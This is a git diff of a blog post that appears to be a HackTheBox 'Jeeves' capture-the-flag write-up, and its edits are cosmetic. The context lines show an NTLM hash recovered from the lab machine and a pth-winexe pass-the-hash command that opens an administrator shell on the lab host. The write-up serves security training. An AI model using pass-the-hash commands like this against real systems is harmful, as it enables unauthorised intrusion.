@@ -13,7 +13,7 @@ comments: true
 # Introduction
 Jeeves is a medium rated machine on HackTheBox platform which got retired last weekend (18.05.2018). Core of this machine revolves around pwnage of Jenkins. Let's get to it.
 
-<img src="/assets/img/blog/htb-jeeves/htb-jeeves-00.png">
+<center><img src="/assets/img/blog/htb-jeeves/htb-jeeves-00.png"></center>
 
 ***
 
@@ -140,7 +140,7 @@ None of these passwords are actually usable apart from *Backup stuff*.
 
 <img src="/assets/img/blog/htb-jeeves/htb-jeeves-06.png">
 
-Does this look similar - `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`? Yup! It is an NTLM hash which we can use for pass the hash attack! Both Metasploit's **psexec** module or **pth-winexe** can be used. 
+Does this look familiar - `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`? Yup! It is an NTLM hash which we can use for pass the hash attack! Both Metasploit's **psexec** module or **pth-winexe** can be used. 
 ```console
 root@EdgeOfNight:~# pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
 E_md4hash wrapper called.
